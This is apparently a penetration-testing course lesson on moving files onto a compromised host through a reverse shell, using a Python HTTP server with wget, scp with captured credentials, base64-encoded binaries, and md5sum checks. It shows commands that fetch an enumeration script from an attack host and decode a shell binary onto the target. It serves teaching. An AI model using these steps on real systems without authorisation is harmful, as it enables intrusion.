During any penetration testing exercise, it is likely that we will need to transfer files to the remote server, such as enumeration scripts or exploits, or transfer data back to our attack host. While tools like Metasploit with a Meterpreter shell allow us to use the Upload command to upload a file, we need to learn methods to transfer files with a standard reverse shell.

# Wget

There are many methods to accomplish this. One method is running a Python HTTP server on our machine and then using wget or cURL to download the file on the remote host. First, we go into the directory that contains the file we need to transfer and run a Python HTTP server in it:

`cd /tmp`
`python3 -m http.server 8000`

Now that we have set up a listening server on our machine, we can download the file on the remote host that we have code execution on:

`wget http://10.10.14.1:8000/linenum.sh`

# Using SCP

Another method to transfer files would be using scp, granted we have obtained ssh user credentials on the remote host. We can do so as follows:
`scp linenum.sh user@remotehost:/tmp/linenum.sh`

Note that we specified the local file name after scp, and the remote directory will be saved to after the :.

# Using Base64

In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to base64 encode the file into base64 format, and then we can paste the base64 string on the remote server and decode it. For example, if we wanted to transfer a binary file called shell, we can base64 encode it as follows:

`base64 shell -w 0`

Now, we can copy this base64 string, go to the remote host, and use base64 -d to decode it, and pipe the output into a file:

`echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell`

# Validating File Transfers

To validate the format of a file, we can run the file command on it:

`file shell`

As we can see, when we run the file command on the shell file, it says that it is an ELF binary, meaning that we successfully transferred it. To ensure that we did not mess up the file during the encoding/decoding process, we can check its md5 hash. On our machine, we can run md5sum on it:

`md5sum shell`

Now, we can go to the remote server and run the same command on the file we transferred:

`md5sum shell`

As we can see, both files have the same md5 hash, meaning the file was transferred correctly.
